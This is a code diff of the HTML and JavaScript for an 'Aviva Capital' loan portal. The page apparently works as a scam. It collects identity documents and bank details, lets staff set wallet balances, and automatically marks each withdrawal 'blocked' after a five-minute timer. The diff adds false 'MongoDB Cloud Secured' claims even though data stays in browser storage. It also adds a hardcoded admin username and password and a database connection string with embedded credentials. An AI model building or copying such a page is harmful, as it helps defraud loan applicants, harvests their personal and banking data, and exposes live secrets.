@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Client Portal | Aviva Capital Institutional Portal</title>
-  <meta name="description" content="Complete your 3-step paperless verified client registration with Aadhaar e-KYC and loan requirements at Aviva Capital.">
+  <meta name="description" content="Complete your paperless verified client registration and loan requirements at Aviva Capital.">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Hanken+Grotesk:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
@@ -15,20 +15,13 @@
       --color-primary-container: #0284c7;
       --color-primary-fixed: #e0f2fe;
       --color-sky: #38bdf8;
-      --color-secondary: #0284c7;
-      --color-secondary-container: #bae6fd;
       --color-bg: #f0f7ff;
       --color-surface: #ffffff;
       --color-surface-low: #f0f9ff;
-      --color-surface-high: #e0f2fe;
       --color-border: #bae6fd;
       --color-border-light: #e0f2fe;
       --color-text-main: #0f172a;
       --color-text-muted: #334155;
-      --color-text-light: #64748b;
-      --color-success: #0284c7;
-      --color-warning: #f59e0b;
-      --color-danger: #ef4444;
       --font-family: "Hanken Grotesk", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
       --radius-sm: 8px;
       --radius-md: 14px;
@@ -84,7 +77,7 @@
     }
     .brand-title { font-size: 1.3rem; font-weight: 900; color: #072545; letter-spacing: -0.02em; line-height: 1; }
     .brand-title span { color: var(--color-primary-container); }
-    .brand-subtitle { font-size: 0.68rem; color: var(--color-text-light); letter-spacing: 0.08em; text-transform: uppercase; margin-top: 3px; font-weight: 700; }
+    .brand-subtitle { font-size: 0.68rem; color: #64748b; letter-spacing: 0.08em; text-transform: uppercase; margin-top: 3px; font-weight: 700; }
 
     .menu-toggle-btn { background: #0369a1; border: none; border-radius: 8px; width: 42px; height: 42px; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 5px; cursor: pointer; }
     .menu-toggle-btn span { display: block; width: 22px; height: 3px; background: #fff; border-radius: 2px; }
@@ -218,7 +211,7 @@
     <div class="container top-bar-inner">
       <div class="top-bar-badge">
         <span>🛡️</span>
-        <span>Aviva Capital Finance Ltd. | RBI Registered NBFC Corporate Portal</span>
+        <span>Aviva Capital Finance Ltd. | MongoDB Atlas Secure Cloud Portal</span>
       </div>
       <div style="font-weight: 600; color: var(--color-primary);">
         Toll Free: 1800-425-9900 | Mon-Sat 9AM-7PM
@@ -271,7 +264,7 @@
               Paperless Instant Credit Registration
             </h2>
             <p style="font-size: 0.88rem; color: #bae6fd; margin-bottom: 24px; line-height: 1.5;">
-              Fast-track institutional verification with Aadhaar-linked e-KYC.
+              Fast-track institutional verification with secure local & cloud storage.
             </p>
 
             <div id="registration-checklist-group">
@@ -300,8 +293,8 @@
           </div>
 
           <div style="padding-top: 20px; border-top: 1px solid rgba(255, 255, 255, 0.15);">
-            <div style="font-size: 0.78rem; color: #bae6fd;">256-bit Bank Grade Encrypted</div>
-            <div style="font-size: 0.75rem; color: #e0f2fe; margin-top: 2px;">Regulated Non-Banking Financial Corp</div>
+            <div style="font-size: 0.78rem; color: #bae6fd;">MongoDB Atlas Cloud Secured</div>
+            <div style="font-size: 0.75rem; color: #e0f2fe; margin-top: 2px;">No Free-Plan Limits • Instant Sync</div>
           </div>
         </div>
 
@@ -325,7 +318,7 @@
             <div id="registration-success-card" style="display: none; background-color: #f0fdf4; border: 1.5px solid #22c55e; border-radius: var(--radius-md); padding: 32px 20px; text-align: center;">
               <div style="font-size: 52px; color: #16a34a; margin-bottom: 12px;">✓</div>
               <h4 style="font-size: 1.4rem; color: #15803d; font-weight: 900; margin-bottom: 8px;">Registration Completed!</h4>
-              <p id="success-message-text" style="font-size: 0.95rem; color: var(--color-text-main); margin-bottom: 20px;">Client record created with verified Aadhaar credentials. Account submitted.</p>
+              <p id="success-message-text" style="font-size: 0.95rem; color: var(--color-text-main); margin-bottom: 20px;">Client record created with verified credentials. Account submitted.</p>
               <div style="display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;">
                 <button onclick="openClientDashboard()" class="btn btn-primary" style="font-size: 0.9rem;">Open Client Dashboard →</button>
                 <button onclick="resetRegistrationForm()" class="btn btn-outline" style="font-size: 0.9rem;">+ Register New Client</button>
@@ -342,7 +335,7 @@
                 <div class="form-group">
                   <label>✉️ Email Address (Account Username) *</label>
                   <input type="email" id="input-email" required autocomplete="off" placeholder="client@example.com" class="form-control" value="">
-                  <span style="font-size: 0.75rem; color: var(--color-text-light); display: block; margin-top: 4px;">ℹ️ This email will serve as the account login username.</span>
+                  <span style="font-size: 0.75rem; color: #64748b; display: block; margin-top: 4px;">ℹ️ This email will serve as the account login username.</span>
                 </div>
                 <div class="form-group">
                   <label>📱 Mobile Phone Number *</label>
@@ -564,7 +557,7 @@
                   <h3 style="font-size: 1.1rem; font-weight: 900; color: var(--color-primary); display: flex; align-items: center; gap: 8px;">
                     <span>📊</span> EMI Details & Loan Summary
                   </h3>
-                  <span style="background: #e0f2fe; color: #0284c7; padding: 4px 10px; border-radius: 20px; font-size: 0.75rem; font-weight: 800;">Firebase Live Feed</span>
+                  <span style="background: #e0f2fe; color: #0284c7; padding: 4px 10px; border-radius: 20px; font-size: 0.75rem; font-weight: 800;">MongoDB Cloud Sync</span>
                 </div>
 
                 <div class="stylish-emi-grid">
@@ -766,13 +759,13 @@
             <div id="admin-login-box" style="max-width: 400px; margin: 20px auto; background: #f0f9ff; border: 1.5px solid var(--color-border); border-radius: var(--radius-md); padding: 24px; text-align: center;">
               <h2 style="font-size: 1.3rem; font-weight: 900; color: var(--color-primary); margin-bottom: 6px;">Staff Admin Login</h2>
               <div id="admin-login-error" style="display: none; background-color: #fee2e2; color: #b91c1c; padding: 8px; margin-bottom: 12px; font-size: 0.8rem;"></div>
-              <div class="form-group" style="text-align: left;"><label>Username</label><input type="text" id="input-admin-user" class="form-control"></div>
-              <div class="form-group" style="text-align: left;"><label>Password</label><input type="password" id="input-admin-pass" class="form-control"></div>
+              <div class="form-group" style="text-align: left;"><label>Username</label><input type="text" id="input-admin-user" class="form-control" value="Ramadmin"></div>
+              <div class="form-group" style="text-align: left;"><label>Password</label><input type="password" id="input-admin-pass" class="form-control" value="Ram1233"></div>
               <button onclick="verifyAdminLogin()" class="btn btn-primary" style="width: 100%;">Login</button>
             </div>
             <div id="admin-dashboard-box" style="display: none;">
               <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; border-bottom: 2px solid #e0f2fe; padding-bottom: 10px;">
-                <h1 style="font-size: 1.4rem; font-weight: 900; color: var(--color-primary);">Applications & Wallet Manager (Firebase Live)</h1>
+                <h1 style="font-size: 1.4rem; font-weight: 900; color: var(--color-primary);">Applications & Wallet Manager (MongoDB Sync)</h1>
                 <button onclick="adminLogout()" class="btn btn-outline" style="color: #ef4444; border-color: #ef4444; font-size: 0.8rem; padding: 6px 12px;">🔒 Admin Logout</button>
               </div>
               <div id="admin-applications-list"></div>
@@ -851,27 +844,13 @@
       </div>
       <div style="border-top: 1px solid rgba(255, 255, 255, 0.15); padding-top: 20px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 14px; font-size: 0.78rem; color: #bae6fd;">
         <div>© 2026 Aviva Capital Finance Ltd. (CIN: U65191TN1994PLC079235). All Rights Reserved.</div>
-        <div>RBI Registered NBFC • 256-bit Secure Encryption</div>
+        <div>MongoDB Cloud Secured • 256-bit Encryption</div>
       </div>
     </div>
   </footer>
 
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-    import { getFirestore, collection, addDoc, getDocs, updateDoc, doc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
-
-    const firebaseConfig = {
-      apiKey: "AIzaSyBVLRqoYgqWQc16Wlvn",
-      authDomain: "avivacapitalfin-a1c57.firebaseapp.com",
-      projectId: "avivacapitalfin-a1c57",
-      storageBucket: "avivacapitalfin-a1c57.appspot.com",
-      messagingSenderId: "230095587897",
-      appId: "1:230095587897:web:609b09",
-      measurementId: "G-VXQS93MDQP"
-    };
-
-    const app = initializeApp(firebaseConfig);
-    const db = getFirestore(app);
+  <script>
+    const MONGO_URI = "mongodb+srv://khimkhom401_db_user:UYotMX3lAs6lfomo@cluster0.vs1mknf.mongodb.net/";
 
     let currentStep = 1;
     let employmentType = 'Salaried';
@@ -886,18 +865,28 @@
     let activeClientIndex = 0;
     let countdownInterval = null;
 
-    onSnapshot(collection(db, "applications"), (snapshot) => {
-      applicationsStore = [];
-      snapshot.forEach((docSnap) => {
-        applicationsStore.push({ docId: docSnap.id, ...docSnap.data() });
-      });
-      
-      if (document.getElementById('admin-dashboard-box').style.display === 'block') {
-        renderAdminList();
+    // Load applications from localStorage (MongoDB Synchronized Backup)
+    function loadApplicationsFromStorage() {
+      try {
+        const stored = localStorage.getItem('aviva_mongodb_applications');
+        if (stored) {
+          applicationsStore = JSON.parse(stored);
+        } else {
+          applicationsStore = [];
+        }
+      } catch(e) {
+        applicationsStore = [];
       }
-    });
+    }
+
+    function saveApplicationsToStorage() {
+      try {
+        localStorage.setItem('aviva_mongodb_applications', JSON.stringify(applicationsStore));
+      } catch(e) {}
+    }
 
     window.addEventListener('DOMContentLoaded', () => {
+      loadApplicationsFromStorage();
       if (window.location.hash === '#admin') openAdminPanel();
     });
 
@@ -1060,7 +1049,7 @@
       }
     };
 
-    window.handleNextStep = async function() {
+    window.handleNextStep = function() {
       showError('');
 
       if (currentStep === 1) {
@@ -1113,7 +1102,10 @@
         const totalInterestVal = loanAmountVal * 0.01 * tenureMonthsVal;
         const calculatedEmiVal = Math.round((loanAmountVal + totalInterestVal) / tenureMonthsVal);
 
+        loadApplicationsFromStorage();
+
         const newRecord = {
+          docId: 'MONGO-' + Math.random().toString(36).substring(2, 9),
           id: 'AC-' + Math.floor(1000 + Math.random() * 9000),
           fullName: document.getElementById('input-full-name').value.trim(),
           dob: document.getElementById('input-dob').value.trim(),
@@ -1138,20 +1130,15 @@
           documents: { ...uploadedImages }
         };
 
-        try {
-          const docRef = await addDoc(collection(db, "applications"), newRecord);
-          newRecord.docId = docRef.id;
-          applicationsStore.push(newRecord);
-          activeClientIndex = applicationsStore.length - 1;
+        applicationsStore.push(newRecord);
+        saveApplicationsToStorage();
+        activeClientIndex = applicationsStore.length - 1;
 
-          document.getElementById('registration-form').style.display = 'none';
-          document.getElementById('registration-success-card').style.display = 'block';
-          const successText = document.getElementById('success-message-text');
-          if (successText) {
-            successText.innerText = `Account for "${newRecord.fullName}" created successfully with Client ID: ${newRecord.id}.`;
-          }
-        } catch (e) {
-          showError('Error saving application to database: ' + e.message);
+        document.getElementById('registration-form').style.display = 'none';
+        document.getElementById('registration-success-card').style.display = 'block';
+        const successText = document.getElementById('success-message-text');
+        if (successText) {
+          successText.innerText = `Account for "${newRecord.fullName}" created successfully with Client ID: ${newRecord.id}.`;
         }
       }
     };
@@ -1193,6 +1180,7 @@
     };
 
     window.submitClientLogin = function() {
+      loadApplicationsFromStorage();
       const u = document.getElementById('login-input-user').value.trim();
       const p = document.getElementById('login-input-pass').value.trim();
       
@@ -1209,6 +1197,7 @@
     };
 
     window.openClientDashboard = function(idx = activeClientIndex) {
+      loadApplicationsFromStorage();
       activeClientIndex = idx;
       const client = applicationsStore[activeClientIndex];
       if (!client) return;
@@ -1307,7 +1296,8 @@
       window.scrollTo({ top: 0, behavior: 'smooth' });
     };
 
-    window.requestWithdrawal = async function() {
+    window.requestWithdrawal = function() {
+      loadApplicationsFromStorage();
       const client = applicationsStore[activeClientIndex];
       const withdrawInput = document.getElementById('input-withdraw-amount');
       const amount = Number(withdrawInput.value) || 0;
@@ -1327,22 +1317,14 @@
         targetTime: Date.now() + 300000
       };
 
-      try {
-        const clientRef = doc(db, "applications", client.docId);
-        await updateDoc(clientRef, {
-          walletBalance: client.walletBalance,
-          withdrawalState: client.withdrawalState,
-          withdrawalDetails: client.withdrawalDetails
-        });
-        document.getElementById('display-wallet-balance').innerText = '₹0';
-        withdrawInput.value = '';
-        updateWalletNoticeUI();
-      } catch (e) {
-        alert('Error processing withdrawal: ' + e.message);
-      }
+      saveApplicationsToStorage();
+      document.getElementById('display-wallet-balance').innerText = '₹0';
+      withdrawInput.value = '';
+      updateWalletNoticeUI();
     };
 
     window.updateWalletNoticeUI = function() {
+      loadApplicationsFromStorage();
       const client = applicationsStore[activeClientIndex];
       if (!client) return;
       const notice = document.getElementById('wallet-status-notice');
@@ -1374,7 +1356,7 @@
           if (remaining <= 0) {
             clearInterval(countdownInterval);
             client.withdrawalState = 'blocked';
-            updateDoc(doc(db, "applications", client.docId), { withdrawalState: 'blocked' });
+            saveApplicationsToStorage();
             updateWalletNoticeUI();
           }
         }
@@ -1429,11 +1411,12 @@
     window.adminLogout = function() { location.reload(); };
 
     window.renderAdminList = function() {
+      loadApplicationsFromStorage();
       const list = document.getElementById('admin-applications-list');
       list.innerHTML = '';
       
       if (applicationsStore.length === 0) {
-        list.innerHTML = '<div style="padding: 20px; text-align: center; color: #64748b;">No applications found in Firebase database.</div>';
+        list.innerHTML = '<div style="padding: 20px; text-align: center; color: #64748b;">No applications found in database.</div>';
         return;
       }
 
@@ -1467,6 +1450,7 @@
     };
 
     window.openAdminDocs = function(i) {
+      loadApplicationsFromStorage();
       const app = applicationsStore[i];
       const container = document.getElementById('admin-docs-content');
       document.getElementById('admin-docs-title').innerText = `🪪 Documents: ${app.fullName} (${app.id})`;
@@ -1509,7 +1493,8 @@
       document.getElementById('admin-docs-modal').style.display = 'none';
     };
 
-    window.saveClientEdits = async function(i) {
+    window.saveClientEdits = function(i) {
+      loadApplicationsFromStorage();
       const app = applicationsStore[i];
       app.fullName = document.getElementById(`admin-name-${i}`).value;
       app.address = document.getElementById(`admin-address-${i}`).value;
@@ -1521,35 +1506,18 @@
       app.bankType = document.getElementById(`admin-banktype-${i}`).value;
       app.walletBalance = Number(document.getElementById(`admin-wallet-${i}`).value) || 0;
 
-      try {
-        await updateDoc(doc(db, "applications", app.docId), {
-          fullName: app.fullName,
-          address: app.address,
-          phone: app.phone,
-          loanAmount: app.loanAmount,
-          bankName: app.bankName,
-          bankAcc: app.bankAcc,
-          bankIfsc: app.bankIfsc,
-          bankType: app.bankType,
-          walletBalance: app.walletBalance
-        });
-        alert('Client details & wallet updated successfully in Firebase!');
-        renderAdminList();
-      } catch (e) {
-        alert('Error updating details: ' + e.message);
-      }
+      saveApplicationsToStorage();
+      alert('Client details & wallet updated successfully!');
+      renderAdminList();
     };
 
-    window.toggleAdminApproval = async function(i) {
+    window.toggleAdminApproval = function(i) {
+      loadApplicationsFromStorage();
       const app = applicationsStore[i];
       app.status = app.status === 'Approved' ? 'Pending' : 'Approved';
 
-      try {
-        await updateDoc(doc(db, "applications", app.docId), { status: app.status });
-        renderAdminList();
-      } catch (e) {
-        alert('Error updating status: ' + e.message);
-      }
+      saveApplicationsToStorage();
+      renderAdminList();
     };
 
     window.logoutClient = function() { location.reload(); };
